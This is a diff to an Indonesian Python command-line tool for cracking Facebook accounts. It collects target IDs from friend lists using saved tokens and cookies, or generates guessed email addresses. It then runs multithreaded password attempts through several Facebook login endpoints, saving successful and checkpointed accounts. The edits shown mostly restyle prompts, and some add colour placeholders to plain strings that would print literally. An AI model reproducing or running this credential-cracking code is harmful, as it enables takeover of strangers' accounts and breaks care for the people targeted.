@@ -26,6 +26,10 @@ from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
 from rich.console import Console
 from rich.panel import Panel
 from rich.style import Style
+from rich import print
+import requests
+import geocoder
+from rich.console import Console
 #------------------[  MODULE  ]-------------------#
 try:
         import rich
@@ -199,10 +203,6 @@ try:times = cek_data["timezone"]
 except:times = cek_data['-']
 try:city = cek_data["city"]
 except:city = cek_data['-']
-from rich import print
-import requests
-import geocoder
-from rich.console import Console
 
 #--------------------[ CONVERTER-BULAN ]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
@@ -237,9 +237,6 @@ lebar_layar = 80
 
 # Menghitung jumlah spasi di awal untuk menengahkan pesan
 spasi_awal = (lebar_layar - len(pesan_selamat)) // 2
-
-# Menampilkan pesan selamat di tengah
-print(" " * spasi_awal + pesan_selamat)
 #------------------[ MACHINE-SUPPORT ]---------------#
 def clear():
     os.system('clear')
@@ -363,7 +360,7 @@ def login():
 		massal()
 	elif ___Sllowly_ID____ in ['2']:
 		prints(nel(f'               {P2}Publik Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
-		idt = input('✶ ━━⫸ ID Target : ')
+		idt = input('✶ ━━⫸ {H} ID Target : ')
 		dump(idt,"",{"Kue":cok},token)
 		setting()
 	elif ___Sllowly_ID____ in ['3']:
@@ -375,13 +372,13 @@ def login():
 	elif ___Sllowly_ID____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .Kue.txt')
-		print('>> Sukses Logout+Hapus Kukis ')
+		print('>> {M} Sukses Logout+Hapus Kukis ')
 		exit()
 	else:
-		print('>> Pilih Yang Bener Asu ')
+		print('>> {M} Pilih Yang Bener Asu ')
 		back()
 def error():
-	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
+	print(f'{k}>> {M}Maaf Fitur Ini Masih Di Perbaiki {x}')
 	time.sleep(4)
 	back()
 #-------------------[PUBLIK]--------------------#    
@@ -414,16 +411,16 @@ def dump(idt,fields,cookie,token):
 		for i in url["friends"]["data"]:
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
-			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
+			sys.stdout.write(f"\r>> {M}sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
 #----------------------[ MENU CRACK LAINNYA ]----------------------#
 def lainnya():
 	cetak(panel(f"[[bold cyan]01[bold white]] Crack Username                   [[bold cyan]03[bold white]] Crack File \n[[bold cyan]02[bold white]] Crack Followers                  [[bold cyan]04[bold white]] Crack Email ",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
-	bray = input(f' [+] Pilih Menu Crack : ')
+	bray = input(f' [+] {H} Pilih Menu Crack : ')
 	if bray in(''):
-		print(' [+] Pilih Yang Bener Asu ');back()
+		print(' [+] {M} Pilih Yang Bener Asu ');back()
 	if bray in('1','01'):
 		crack_nama()
 	elif bray in('2','02'):
@@ -433,7 +430,7 @@ def lainnya():
 	elif bray in('4','04'):
 		crack_email()
 	else:
-		print(' [+] Pilih Yang Bener Asu ')
+		print(' [+] {M} Pilih Yang Bener Asu ')
 		exit()
 #-----------------[ CRACK EMAIL ]-----------------#
 def mail2():
@@ -446,13 +443,13 @@ def mail2():
 	global ok , cc
 	nama = input(f'{P}[{H}?{P}] nama target : ')
 	if ',' in str(nama):
-		print(f' {P}└─{J} masukan nama, jangan kosong ')
+		print(f' {P}└─{J} {H} masukan nama, jangan kosong ')
 		time.sleep(3);exit()
-	doma = input(f'{P}[{H}?{P}] domain (ex:@gmail.com) : ')
+	doma = input(f'{P}[{H}?{P}] {H}domain (ex:@gmail.com) : ')
 	if '@' not in str(doma) or '.com' not in str(doma):
-		print(f' {P}└─{J} masukkan domain dengan benar ')
+		print(f' {P}└─{J} {H} masukkan domain dengan benar ')
 		time.sleep(3);exit()
-	jumlah = input(f'{P}[{H}?{P}] total dump (max:10000) : ')
+	jumlah = input(f'{P}[{H}?{P}] {H}total dump (max:10000) : ')
 	for xyz in range(int(jumlah)):
 		AA = nama
 		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
@@ -461,7 +458,7 @@ def mail2():
 		if DD in id:pass
 		else:id.append(DD+'|'+nama)
 		if len(dump)==999999:passwrd()
-		sys.stdout.write(f"\r{P}[{H}±{P}] berhasil mengumpulkan {asu}{len(id)} {P}email...");sys.stdout.flush()
+		sys.stdout.write(f"\r{P}[{H}±{P}] {H} berhasil mengumpulkan {asu}{len(id)} {H}email...");sys.stdout.flush()
 		time.sleep(0.0000003)
 	print("\r")
 	setting()
@@ -469,11 +466,11 @@ def mail2():
 def crack_file():
 	try:vin = os.listdir('/sdcard/downloads/')
 	except FileNotFoundError:
-		print(' [+] File Tidak Ditemukan ')
+		print(' [+] {H}File Tidak Ditemukan ')
 		time.sleep(2)
 		back()
 	if len(vin)==0:
-		print(' [+] Kamu Tidak Memiliki File Dump ')
+		print(' [+] {H} Kamu Tidak Memiliki File Dump ')
 		time.sleep(2)
 		back()
 	else:
@@ -495,12 +492,12 @@ def crack_file():
 		geeh = input(' [+] Pilih : ')
 		try:geh = lol[geeh]
 		except KeyError:
-			print(f' [+] Pilih Yang Bener Kontol {x}')
+			print(f' [+] {H} Pilih Yang Bener Kontol {x}')
 			time.sleep(3)
 			back()
 		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
 		except:
-			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
+			print(' [+] {H} File Tidak Ditemukan, Coba Lagi Nanti ')
 			time.sleep(2)
 			back()
 		setting()
@@ -511,16 +508,16 @@ def result():
 	banner()
 	print(f'{B}[{J}01{B}] {P}Hasil {h}OK{x} Anda ')
 	print(f'{B}[{J}02{B}] {P}Hasil {k}CP{x} Anda ')
-	kz = input(f' └── Pilih : ')
+	kz = input(f' └──{H} Pilih : ')
 	if kz in ['02','2']:
 		
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print(f' {P}└─{J} file tidak di temukan ')
+			print(f' {P}└─{J}{M} file tidak di temukan ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print(f' {P}└─{J} anda tidak memiliki hasil CP ')
+			print(f' {P}└─{J}{M} anda tidak memiliki hasil CP ')
 			time.sleep(2)
 			back()
 		else:
@@ -542,11 +539,11 @@ def result():
 			
 			try:geh = lol[geeh]
 			except KeyError:
-				print(f' {P}└─{J} pilih yang benar...')
+				print(f' {P}└─{J}{M} pilih yang benar...')
 				back()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print(f' {P}└─{J} file tidak di temukan ')
+				print(f' {P}└─{J}{M} file tidak di temukan ')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -561,11 +558,11 @@ def result():
 		
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print(f' {P}└─{J} file tidak di temukan ')
+			print(f' {P}└─{J}{M} file tidak di temukan ')
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			print(f' {P}└─{J} anda tidak mempunyai fileOK ')
+			print(f' {P}└─{J}{M} anda tidak mempunyai fileOK ')
 			time.sleep(2)
 			back()
 		else:
@@ -583,15 +580,15 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
-			geeh = input(f' └── Pilih : ')
+			geeh = input(f' └──{H} Pilih : ')
 			
 			try:geh = lol[geeh]
 			except KeyError:
-				print(f' {P}└─{J} pilih yang bener kontol ')
+				print(f' {P}└─{J}{M} pilih yang bener kontol ')
 				back()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print(f' {P}└─{J} file tidak di temukan ')
+				print(f' {P}└─{J}{M} file tidak di temukan ')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -604,18 +601,18 @@ def result():
 	elif kz in ['3']:
 		back()
 	else:
-		print(f' {P}└─{J} pilih yang bener kontol ')
+		print(f' {P}└─{J}{M} pilih yang bener kontol ')
 		back()
 ###----------[ CRACK MASSAL ]----------###
 def massal():
-	prints(nel(f'               {P2}Massal Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'               {P2}{H}Massal Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
 	    exit()
 	try:
-		kumpulkan = int(input(f'Mau Berapa ID ? : '))
+		kumpulkan = int(input(f'{H}Mau Berapa ID ? : '))
 	except ValueError:
 	    exit()
 	if kumpulkan<1 or kumpulkan>1000:
@@ -624,7 +621,7 @@ def massal():
 	bilangan = 0
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
-		Masukan = input(f'ID Ke  '+str(bilangan)+f' : ')
+		Masukan = input(f'{H}ID Ke  '+str(bilangan)+f' : ')
 		uid.append(Masukan)
 	for user in uid:
 	    try:
@@ -657,7 +654,7 @@ def massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try:
-	      print("Total DUMP  : "+str(len(id))) 
+	      print("{H}Total DUMP  : "+str(len(id))) 
 	      setting()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -665,9 +662,9 @@ def massal():
 		exit()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	prints(nel(f'               {P2}login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'               {P2}{H}login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	cetak(nel(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"{H2}{len(id)}{P2} ID TELAH DIKUMPULKAN",width=70,padding=(0,7),style=f"{color_panel}")) 
-	hu = input(f'✶ ━━⫸ Input : ')
+	hu = input(f'✶ ━━⫸{H} Input : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua) 
@@ -685,9 +682,9 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		prints(nel(f'         {P2}Input Tidak Diketahui{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+		prints(nel(f'         {P2}{M}Input Tidak Diketahui{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 		exit()
-	prints(nel(f'               {P2}login Method{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'               {P2}{H}login Method{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	prints(nel(f'{P2}[{color_text}01{P2}]. Method free.facebook.com [[green] Validate [white]]\n[{color_text}02{P2}]. Method m.facebook.com [[green] Async [white]]\n[{color_text}03{P2}]. Method graph.facebook.com [[green] B-Api [white]]',width=70,padding=(0,7),style=f"{color_panel}")) 
 	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if hc in ['1','01']:
@@ -700,7 +697,7 @@ def setting():
 		method.append('metod4')
 	else:
 		method.append('metod1')
-	prints(nel(f'              {P2}Manual Password{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'              {P2}{H}Manual Password?{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	pwplus=input(f'✶ ━━⫸ {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
@@ -716,7 +713,7 @@ def setting():
 def passwrd():
 	clear()
 	banner()
-	prints(nel(f'       {P2}{M2}!{P2} PROSES CRACK SEDANG BERLANGSUNG{M2} !{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'       {P2}{M2}!{P2}{H} PROSES CRACK SEDANG BERLANGSUNG{M2} !{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -1622,7 +1619,7 @@ def ngewe():
     except FileNotFoundError:
         os.system("clear")
         banner()
-        prints(nel(f'              {P2}Login Api Key Lisensi{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+        prints(nel(f'              {P2}{M}Login Api Key Lisensi{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
         print(' [%s1%s] Login Ke Tools'%(H,N))
         print(' [%s2%s] Hubungi Admin'%(H,N))
         pil = input(' %s[%s?%s] Choice : '%(N,K,N))
@@ -1632,17 +1629,17 @@ def ngewe():
             jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
             os.system('xdg-open https://wa.me/6281283547452?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);ngewe()
         elif pil in["1","01"]:
-            prints(nel(f'             {P2}Masukan Username Anda{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+            prints(nel(f'             {P2}{H}Masukan Username Anda{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
         else:
-            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
-        pw = input(f"{P}[{M}?{P}] Enter Username : {H}")
+            exit(f"{N}[{M}×{N}]{H} Sorry, it is wrong...!")
+        pw = input(f"{P}[{M}?{P}]{H} Enter Username : {H}")
         if pw in user:
             jalan(f"{P}[{H}✓{P}]{H} Username Anda Berhasil Didaftarkan");time.sleep(1);kska()
         else:
             jalan(f"\n{P}[{M}!{P}]{M} Maaf Username Tidak Terdaftar");time.sleep(1);ngewe()
     login()
 def kska():
-    xx = input(f"{P}[{M}?{P}] Api Key : {H}")
+    xx = input(f"{P}[{M}?{P}]{M} Api Key : {H}")
     loading()
     if xx in[""]:
         jalan(f"{P}[{M}X{P}]{M} Sorry don't be blank!");time.sleep(1);ngewe()
